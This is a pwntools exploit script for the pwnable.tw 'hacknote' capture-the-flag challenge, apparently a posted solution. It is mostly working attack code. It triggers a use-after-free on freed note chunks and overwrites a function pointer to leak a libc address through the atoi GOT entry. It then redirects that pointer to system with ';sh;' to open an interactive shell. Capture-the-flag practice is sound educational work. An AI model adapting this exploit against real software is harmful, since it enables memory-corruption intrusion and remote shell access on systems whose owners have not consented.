#!/usr/bin/env python

from pwn import *

r = remote("chall.pwnable.tw", 10102)
# r = process('./hacknote', env = {"LD_PRELOAD": os.path.join(os.getcwd(), "libc_32.so.6")})

def add_note(sz, data):
    r.sendafter(':', '1')
    r.sendafter(':', str(sz))
    r.sendafter(':', str(data))

def del_note(idx):
    r.sendafter(':', '2')
    r.sendafter(':', str(idx))

def print_note(idx):
    r.sendafter(':', '3')
    r.sendafter(':', str(idx))


print_addr = 0x804862B
atoi_got = 0x804a034

add_note(40, 'lala')
add_note(40, 'gaga')
del_note(0)
del_note(1)
add_note(8, p32(print_addr) + p32(atoi_got))
print_note(0)
libc = u32(r.recvline()[:-1].ljust(4, '\x00')) - 0x002d050
log.info('libc base address: {}'.format(hex(libc)))
del_note(2)

add_note(80, 'aaaa')
del_note(3)
add_note(8, flat([libc + 0x3a940, ";sh;"]))
print_note(0)

r.interactive()
